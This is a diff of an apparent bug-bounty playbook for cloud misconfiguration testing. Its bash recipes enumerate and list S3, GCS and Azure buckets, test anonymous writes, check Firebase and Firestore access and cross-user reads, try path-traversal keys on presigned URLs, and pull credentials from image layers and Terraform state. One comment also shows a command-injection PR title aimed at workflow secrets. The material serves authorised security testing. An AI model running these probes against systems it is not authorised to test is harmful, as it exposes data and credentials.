@@ -134,13 +134,13 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```
   ```bash
   # 2. each bucket's REST endpoint with no credentials: listing, ACL, old versions, and on GCS the caller's permissions
-  W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
+  D="$E/evidence/$H/CLD-001"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
   g(){ curl -sS "${HDR[@]}" -m 20 -o "$D/$2" -w "%{http_code} %{size_download} $2\n" "$1"; sleep "$W"; }
   while read -r P N; do f=$(printf '%s-%s' "$P" "$N" | tr '/' '_')
     case "$P" in
       s3)     g "https://$N.s3.amazonaws.com/?list-type=2&max-keys=25" "$f.list.xml"; g "https://$N.s3.amazonaws.com/?acl" "$f.acl.xml"
               g "https://$N.s3.amazonaws.com/?versions&max-keys=25" "$f.versions.xml"
-              curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | tr -d '\r' > "$D/$f.region" ;;
+              curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | sed 's/\r$//' > "$D/$f.region" ;;
       gcs)    g "https://storage.googleapis.com/storage/v1/b/$N/o?maxResults=25&fields=items(name,size,updated)" "$f.list.json"
               g "https://storage.googleapis.com/storage/v1/b/$N/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy" "$f.perms.json" ;;
       azure)  g "https://${N%%/*}.blob.core.windows.net/${N#*/}?restype=container&comp=list&maxresults=25" "$f.list.xml" ;;
@@ -155,7 +155,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   #    cloud.env: AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY of an IAM user in our own AWS account holding only the
   #    AWS-managed AmazonS3ReadOnlyAccess policy (a cross-account read needs our side's permission too), and
   #    GCP_TOKEN=$(gcloud auth print-access-token) for our own Google account
-  source "$E/accounts/cloud.env"
+  D="$E/evidence/$H/CLD-001"; source "$E/accounts/cloud.env"
   while read -r P N; do f=$(printf '%s-%s' "$P" "$N" | tr '/' '_')
     case "$P" in
       s3)  RG=$(awk '{print $2}' "$D/$f.region"); RG=${RG:-us-east-1}
@@ -220,18 +220,20 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
 - **How:**
   ```bash
   D="$E/evidence/$H/CLD-002"; mkdir -p "$D"; U=$(jq -r '.authorisation.h1_username // empty' "$E/engagement.json"); U=${U:-researcher}
-  N='<bucket name the asset uses>'; M="h1-$U-cld002-$(date -u +%Y%m%d%H%M%S)-$RANDOM.txt"
+  N='<bucket name the asset uses>'; M="h1-$U-cld002-$(date -u +%Y%m%d%H%M%S)-$RANDOM.txt"; echo "$N $M" > "$D/target.txt"
+  printf 'Harmless write test by HackerOne user %s for %s at %s UTC. Safe to delete.\n' "$U" "$H" "$(date -u '+%F %T')" > "$D/$M"
   # 1. read-only evidence: the ACL grants to everyone or to any AWS account, and the GCS permissions of an anonymous caller
   curl -sS "${HDR[@]}" "https://$N.s3.amazonaws.com/?acl" | grep -oE 'groups/global/[A-Za-z]+</URI></Grantee><Permission>[A-Z_]+'
   curl -sS "${HDR[@]}" "https://storage.googleapis.com/storage/v1/b/$N/iam/testPermissions?permissions=storage.objects.create&permissions=storage.objects.delete" | jq -c .
   ```
   ```bash
   # 2. S3 with no credentials: start a multipart upload and abort it at once (requires s3:PutObject, creates no object)
+  D="$E/evidence/$H/CLD-002"; read -r N M < "$D/target.txt"
   R=$(curl -sS "${HDR[@]}" -X POST "https://$N.s3.amazonaws.com/sane-test/$M?uploads"); echo "$R" | grep -oE '<(UploadId|Code)>[^<]{0,40}'
   UPID=$(echo "$R" | grep -oE '<UploadId>[^<]+' | cut -d'>' -f2)
   [ -n "$UPID" ] && curl -sS "${HDR[@]}" -X DELETE -o /dev/null -w '%{http_code} aborted\n' "https://$N.s3.amazonaws.com/sane-test/$M?uploadId=$UPID"
-  # 3. only when the policy allows write tests: one marker file, read back without credentials, deleted, confirmed gone
-  printf 'Harmless write test by HackerOne user %s for %s at %s UTC. Safe to delete.\n' "$U" "$H" "$(date -u '+%F %T')" > "$D/$M"
+  # 3. only when the policy allows write tests: one marker file (written in block 1), read back without credentials,
+  #    deleted, confirmed gone
   echo "$(date -u +%FT%TZ) s3://$N/sane-test/$M created by CLD-002 (deleted in the next lines)" >> "$D/cleanup.md"
   curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: text/plain' --data-binary @"$D/$M" -D "$D/put.headers" -o /dev/null -w '%{http_code} put\n' "https://$N.s3.amazonaws.com/sane-test/$M"
   curl -sS "${HDR[@]}" -w '\n%{http_code} read back\n' "https://$N.s3.amazonaws.com/sane-test/$M"
@@ -241,7 +243,8 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```bash
   # 4. the same as any authenticated AWS account: our own IAM user, whose own policy allows s3:PutObject and
   #    s3:DeleteObject. bucket-owner-full-control leaves the organisation in control of the marker if the delete fails.
-  source "$E/accounts/cloud.env"; RG=$(curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | awk '{print $2}' | tr -d '\r')
+  D="$E/evidence/$H/CLD-002"; read -r N M < "$D/target.txt"; source "$E/accounts/cloud.env"
+  RG=$(curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | awk '{print $2}' | sed 's/\r$//')
   S=(--aws-sigv4 "aws:amz:${RG:=us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
   curl -sS "${HDR[@]}" "${S[@]}" -X PUT -H 'x-amz-acl: bucket-owner-full-control' -H 'Content-Type: text/plain' --data-binary @"$D/$M" \
     -o /dev/null -w '%{http_code} put as any AWS account\n' "https://$N.s3.$RG.amazonaws.com/sane-test/$M"
@@ -300,24 +303,25 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
     terraform tfstate state config db dump archive > "$D/words.txt"
   while read -r s; do echo "$s"; while read -r w; do printf '%s-%s\n%s-%s\n%s%s\n%s.%s\n' "$s" "$w" "$w" "$s" "$s" "$w" "$s" "$w"; done < "$D/words.txt"; done < "$D/seeds.txt" \
     | grep -E '^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$' | sort -u > "$D/candidates.txt"; wc -l < "$D/candidates.txt"
-  # existence: 404 is a free name on S3 and GCS, anything else is taken; an Azure storage account is a DNS name
+  # existence: 404 is a free name on S3 and GCS, while 200, 301, 307 and 403 mean it is taken; an Azure storage account is a DNS name
   while read -r n; do
     case "$n" in *.*) u="https://s3.amazonaws.com/$n/" ;; *) u="https://$n.s3.amazonaws.com/" ;; esac
     s3=$(curl -sS "${HDR[@]}" -I -o /dev/null -w '%{http_code}' "$u")
     gcs=$(curl -sS "${HDR[@]}" -I -o /dev/null -w '%{http_code}' "https://storage.googleapis.com/$n/")
-    a=$(printf %s "$n" | tr -d '.-'); az=$([ ${#a} -le 24 ] && dig +short "$a.blob.core.windows.net" | head -1)
+    a=$(printf %s "$n" | sed 's/[.-]//g'); az=$([ ${#a} -le 24 ] && dig +short "$a.blob.core.windows.net" | head -1)
     echo "$n s3=$s3 gcs=$gcs azure=${az:+exists}"; sleep "$W"
   done < "$D/candidates.txt" | tee "$D/exists.txt" | grep -vE ' s3=404 gcs=404 azure=$'
   ```
   ```bash
   # the anonymous listing of every name that exists
-  grep -v ' s3=404' "$D/exists.txt" | cut -d' ' -f1 | grep -v '\.' | while read -r n; do
+  D="$E/evidence/@programme/CLD-003"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
+  grep -v ' s3=404' "$D/exists.txt" | awk '{print $1}' | grep -v '\.' | while read -r n; do
     curl -sS "${HDR[@]}" -o "$D/s3-$n.xml" -w "%{http_code} s3 $n\n" "https://$n.s3.amazonaws.com/?list-type=2&max-keys=20"; sleep "$W"; done
-  grep -v ' gcs=404' "$D/exists.txt" | cut -d' ' -f1 | while read -r n; do
+  grep -v ' gcs=404' "$D/exists.txt" | awk '{print $1}' | while read -r n; do
     curl -sS "${HDR[@]}" -o "$D/gcs-$n.json" -w "%{http_code} gcs $n\n" "https://storage.googleapis.com/storage/v1/b/$n/o?maxResults=20&fields=items(name)"; sleep "$W"; done
   grep -l '<ListBucketResult' "$D"/s3-*.xml; grep -l '"items"' "$D"/gcs-*.json
   # Azure: a short list of container names on each account that exists
-  grep 'azure=exists' "$D/exists.txt" | cut -d' ' -f1 | tr -d '.-' | while read -r a; do for c in public assets images media files uploads backup data static; do
+  grep 'azure=exists' "$D/exists.txt" | awk '{print $1}' | sed 's/[.-]//g' | while read -r a; do for c in public assets images media files uploads backup data static; do
     curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} azure $a/$c\n" "https://$a.blob.core.windows.net/$c?restype=container&comp=list&maxresults=5"; sleep "$W"; done; done | grep '^200'
   ```
 - **Proof:** the existence answer, the listing (key count, first key names, prefix structure) and the ownership
@@ -372,7 +376,8 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   POL='<Policy value>'; printf '%s' "$POL" | tr -- '-_~' '+=/' | base64 -d 2>/dev/null | jq -c '.Statement[] | {Resource, until: .Condition.DateLessThan}'
   ```
   ```text
-  key variants for check 1 (B uploads first; B's id and key come from B's own session)
+  key variants for check 1, filled in and saved one per line as $E/evidence/$H/CLD-004/variants.txt
+  (B uploads first; B's id and key come from B's own session)
   <B's file id>
   <B's object key, e.g. uploads/<B id>/report.pdf>
   <A's key prefix>/../<B id>/report.pdf
@@ -381,6 +386,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```
   ```bash
   # 2. the minting request from the proxy history, replayed by A with each variant (one per line in variants.txt)
+  D="$E/evidence/$H/CLD-004"
   while read -r k; do
     curl -sS "${HDR[@]}" $A -X POST "$T/api/files/sign" -H 'Content-Type: application/json' --data-raw "{\"key\":\"$k\"}" -w '\n%{http_code}\n'; sleep 1
   done < "$D/variants.txt" | tee "$D/a-asks-for-b.txt"
@@ -443,11 +449,12 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   curl -sS "${HDR[@]}" -o "$D/init.json" -w '%{http_code} /__/firebase/init.json\n' "$T/__/firebase/init.json"
   RX="(apiKey|databaseURL|projectId|storageBucket)[\"']?[[:space:]]*:[[:space:]]*[\"'][^\"']+"
   { cat "$D/init.json"; grep -rhoE "$RX" "$E/recon/$H/" 2>/dev/null; } | grep -oE "$RX" | sed -E "s/[\"'[:space:]]//g; s/:/=/" | sort -u | tee "$D/config.txt"
-  v(){ awk -F= -v k="$1" '$1==k{print $2; exit}' "$D/config.txt"; }        # several projects (dev, prod): one pass each
+  v(){ awk -v k="$1" 'BEGIN{FS="="} $1==k{print $2; exit}' "$D/config.txt"; }        # several projects (dev, prod): one pass each
   KEY=$(v apiKey); PID=$(v projectId); SB=$(v storageBucket); DB=$(v databaseURL); DB=${DB:-https://$PID-default-rtdb.firebaseio.com}
   FS="firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents"
-  grep -rhoE "(ref|child|collection|doc|collectionGroup)\([\"'][A-Za-z0-9_/-]{2,60}[\"']" "$E/recon/$H/" 2>/dev/null | grep -oE "[\"'][^\"']+" | tr -d "\"'" \
-    | cut -d/ -f1 | sort | uniq -c | sort -rn | head -15 | tee "$D/paths.txt"
+  printf 'KEY=%q PID=%q SB=%q DB=%q U=%q\n' "$KEY" "$PID" "$SB" "$DB" "$U" > "$D/vars.sh"      # the later blocks source this
+  grep -rhoE "(ref|child|collection|doc|collectionGroup)\([\"'][A-Za-z0-9_/-]{2,60}[\"']" "$E/recon/$H/" 2>/dev/null | grep -oE "[\"'][^\"']+" \
+    | sed -e "s/[\"']//g" -e 's#/.*##' | sort | uniq -c | sort -rn | head -15 | tee "$D/paths.txt"
   # 1. every store with no token; mask.fieldPaths=sane_none returns document names without field values
   curl -sS "${HDR[@]}" -o "$D/rtdb.anon.json" -w '%{http_code} realtime database root, no token\n' "$DB/.json?shallow=true"; head -c 300 "$D/rtdb.anon.json"; echo
   for c in $(awk '{print $2}' "$D/paths.txt"); do
@@ -459,6 +466,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   # 2. a token from the project itself: anonymous sign-in first, an e-mail user under the programme's alias rule if that is off.
   #    identitytoolkit.googleapis.com is Google's sign-in API for this project: the scope guard refuses this POST until
   #    the host is recorded in $E/allow-infra.txt (add the project id as a comment).
+  D="$E/evidence/$H/CLD-005"; source "$D/vars.sh"
   su(){ curl -sS "${HDR[@]}" -H "Referer: $T/" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" -H 'Content-Type: application/json' -d "$1"; }
   su '{"returnSecureToken":true}' > "$E/accounts/cld005.json"
   jq -e .idToken "$E/accounts/cld005.json" >/dev/null || su "{\"email\":\"$U+cld005@wearehackerone.com\",\"password\":\"Sane-$(openssl rand -hex 8)\",\"returnSecureToken\":true}" > "$E/accounts/cld005.json"
@@ -468,6 +476,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```bash
   # 3. the same reads as that project user, then B's record read with A's token (A's and B's ID tokens and uids from
   #    their browser storage, key firebase:authUser:<apiKey>:[DEFAULT]; "users" stands for the per-user collection in paths.txt)
+  D="$E/evidence/$H/CLD-005"; source "$D/vars.sh"; FS="firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents"
   TOK=$(jq -r '.idToken // empty' "$E/accounts/cld005.json")
   curl -sS "${HDR[@]}" -o "$D/rtdb.tok.json" -w '%{http_code} realtime database root, project user\n' "$DB/.json?shallow=true&auth=$TOK"
   for c in $(awk '{print $2}' "$D/paths.txt"); do
@@ -475,13 +484,17 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   curl -sS "${HDR[@]}" -H "Authorization: Firebase $TOK" -o "$D/storage.tok.json" -w '%{http_code} storage listing, project user\n' "https://firebasestorage.googleapis.com/v0/b/$SB/o?maxResults=10&delimiter=/"
   AT='<A ID token>'; BUID='<B uid>'
   curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -w '\n%{http_code} B record with A token\n' "https://$FS/users/$BUID?mask.fieldPaths=email"
+  ```
+  ```bash
   # 4. only when the policy allows write tests: one new key, read back, deleted (never PUT or PATCH an existing path)
+  D="$E/evidence/$H/CLD-005"; source "$D/vars.sh"; TOK=$(jq -r '.idToken // empty' "$E/accounts/cld005.json")
   curl -sS "${HDR[@]}" -X PUT -w ' %{http_code} write\n' "$DB/h1-$U-cld005.json?auth=$TOK" -d "{\"note\":\"harmless test by HackerOne user $U\",\"at\":\"$(date -u +%FT%TZ)\"}"
   curl -sS "${HDR[@]}" -w ' %{http_code} read back\n' "$DB/h1-$U-cld005.json?auth=$TOK"
   curl -sS "${HDR[@]}" -X DELETE -w ' %{http_code} delete\n' "$DB/h1-$U-cld005.json?auth=$TOK"
   ```
   ```bash
   # 5. remove the project user created in step 2 (the same recorded host as step 2)
+  D="$E/evidence/$H/CLD-005"; source "$D/vars.sh"
   curl -sS "${HDR[@]}" -H "Referer: $T/" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=$KEY" -H 'Content-Type: application/json' \
     -d "{\"idToken\":\"$(jq -r .idToken "$E/accounts/cld005.json")\"}" -w ' %{http_code} user deleted\n'
   ```
@@ -677,7 +690,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   # 3. one read-only request per resource the client names: the bucket by prefix, a table by count (no items returned)
   BK=$(grep -m1 -E 'aws_user_files_s3_bucket|bucket_name|bucketName' "$D/resources.txt" | grep -oE '[a-z0-9][a-z0-9.-]+[a-z0-9]$')
   for pfx in "" public/ protected/ private/; do
-    aws4 "$RG:s3" -o "$D/s3-list-${pfx%/}.xml" -w "%{http_code} list prefix '$pfx'\n" "https://$BK.s3.$RG.amazonaws.com/?list-type=2&max-keys=20&delimiter=/&prefix=$pfx"; sleep 1; done
+    aws4 "$RG:s3" -o "$D/s3-list-${pfx%/}.xml" -w "%{http_code} list prefix '$pfx'\n" "https://$BK.s3.$RG.amazonaws.com/?list-type=2&max-keys=20&delimiter=%2F&prefix=${pfx//\//%2F}"; sleep 1; done
   grep -oE '<(Code|KeyCount|Prefix)>[^<]{0,80}' "$D"/s3-list-*.xml
   DDB="dynamodb.$RG.amazonaws.com"; TB='<table name from resources.txt>'
   aws4 "$RG:dynamodb" -H 'Content-Type: application/x-amz-json-1.0' -H 'X-Amz-Target: DynamoDB_20120810.Scan' \
@@ -809,6 +822,8 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   #    second GitHub account of ours for a faithful outsider. A marker shows execution with secrets, for example a title of
   #      x"; echo "cld010-$(printf %s "$NPM_TOKEN" | sha256sum | cut -c1-12)"; echo "
   #    or a package.json "preinstall" script in the branch for a checkout-and-build workflow.
+  D="$E/evidence/@programme/CLD-010"; ORG='<GitHub organisation login the scope lists>'
+  api(){ curl -sS "${HDR[@]}" -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/$1"; }
   api "repos/<our login>/<repo>/actions/runs?per_page=5" | jq -r '.workflow_runs[] | [.id, .event, .conclusion, .html_url] | @tsv'
   # 5. read-only evidence from the organisation's own history: privileged runs on outside pull requests, and their runners
   api "repos/$ORG/<repo>/actions/runs?event=pull_request_target&per_page=10" | jq -r '.workflow_runs[] | [.id, .head_repository.full_name, .conclusion] | @tsv'
@@ -849,8 +864,9 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   `quay.io/<org>`, the public ECR gallery, images named in its compose files, Helm charts and manifests. CI outputs:
   GitHub Actions artefacts and logs of its public repositories, GitLab public pipelines' job logs and artefacts,
   Travis CI and CircleCI builds of public projects (#496937 and #215625 were tokens in Travis CI logs). The
-  repository files and their history are INF-015's card. No capability gates the image part; the GitHub artefact
-  download needs `GH_TOKEN` of our own account, and a note without it says that artefacts were not checked.
+  repository files and their history are INF-015's card, which also glances at CI logs: one credential is one
+  finding. No capability gates the image part; the GitHub artefact download needs `GH_TOKEN` of our own account, and
+  a note without it says that artefacts were not checked.
 - **Test:** build arguments, copied configuration and checked-out credentials end up in published outputs: `ENV`
   values and `ARG` lines in an image's history, `.env`, `.npmrc`, `.docker/config.json`, `.git-credentials` or
   `id_rsa` in a layer, the `.git/config` that `actions/checkout` writes (its `extraheader` carries a token) inside an
@@ -873,11 +889,11 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   jq -r '.layers[] | [.digest, .size] | @tsv' "$D/img/manifest.json"
   L='<layer digest>'; curl -sSL "${HDR[@]}" -H "Authorization: Bearer $TOK" -o "$D/img/layer.tgz" "https://registry-1.docker.io/v2/$REPO/blobs/$L"
   tar -tzf "$D/img/layer.tgz" | grep -iE '(^|/)(\.env|\.npmrc|\.pypirc|\.netrc|\.git-credentials|credentials|config\.json|id_rsa|settings\.xml|[^/]*\.tfstate)$' | tee "$D/img/hits.txt"
-  [ -s "$D/img/hits.txt" ] && mkdir -p "$D/img/x" && tar -xzf "$D/img/layer.tgz" -C "$D/img/x" -T "$D/img/hits.txt"   # zstd layers: tar --zstd
+  [ -s "$D/img/hits.txt" ] && mkdir -p "$D/img/x" && tar -xzf "$D/img/layer.tgz" -C "$D/img/x" --files-from="$D/img/hits.txt"   # zstd layers: tar --zstd
   ```
   ```bash
   # 3. GitHub Actions artefacts of the organisation's public repositories (the listing is public, the download needs GH_TOKEN)
-  ORG='<GitHub organisation login>'
+  D="$E/evidence/@programme/CLD-011"; ORG='<GitHub organisation login>'
   for r in $(curl -sS "${HDR[@]}" "https://api.github.com/orgs/$ORG/repos?type=public&per_page=100" | jq -r '.[].full_name'); do
     curl -sS "${HDR[@]}" "https://api.github.com/repos/$r/actions/artifacts?per_page=20" \
       | jq -r --arg r "$r" '.artifacts[]? | select(.expired | not) | [$r, .id, .name, .size_in_bytes, .created_at] | @tsv'; sleep 1
@@ -962,7 +978,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```bash
   # only where the policy allows write tests: start a blob upload to a new repository name of ours and cancel it.
   # Never push a manifest or a tag, never write to an existing repository.
-  L=$(curl -sSk "${HDR[@]}" -X POST -D- -o /dev/null "$T/v2/h1-sane-test/blobs/uploads/" | grep -i '^location:' | awk '{print $2}' | tr -d '\r')
+  L=$(curl -sSk "${HDR[@]}" -X POST -D- -o /dev/null "$T/v2/h1-sane-test/blobs/uploads/" | grep -i '^location:' | awk '{print $2}' | sed 's/\r$//')
   echo "upload session: ${L:-refused}"
   [ -n "$L" ] && { case "$L" in http*) UL="$L" ;; *) UL="$T$L" ;; esac; curl -sSk "${HDR[@]}" -X DELETE -o /dev/null -w '%{http_code} cancelled\n' "$UL"; }
   ```
@@ -1087,6 +1103,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
   ```
   ```bash
   # 3. read a state without printing secrets: version, backend, resource types, secret-bearing attribute paths with values cut
+  D="$E/evidence/$H/CLD-014"
   for f in "$D"/web_*; do jq -e '.lineage' "$f" >/dev/null 2>&1 || continue; echo "== $f"
     jq -c '{terraform_version, serial, backend: .backend}' "$f"
     jq -r '.resources[]? | "\(.type).\(.name)"' "$f" | sort | uniq -c | sort -rn | head -25
@@ -1094,6 +1111,7 @@ CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review,
       | select(.key | test("password|secret|private_key|token|access_key|connection_string|kube_config|result$"))
       | select(.value | type == "string" and length > 8) | "\($t).\($n).\(.key) = \(.value[0:4])...\(.value[-4:])"' "$f" | head -30
     jq -r '.outputs // {} | to_entries[] | select(.value.sensitive == true) | "output \(.key) (sensitive)"' "$f"
+    jq -r '.resources[]? | select(.type == "aws_iam_access_key") | .instances[]? | "access key id \(.attributes.id) (its secret is the .secret above)"' "$f"
   done
   # 4. the remote state the backend pointer names (S3 backend), fetched anonymously; then one identity call for one cloud key
   PT="$D/web_.terraform_terraform.tfstate"; BB=$(jq -r '.backend.config.bucket // empty' "$PT" 2>/dev/null); BK=$(jq -r '.backend.config.key // empty' "$PT" 2>/dev/null)
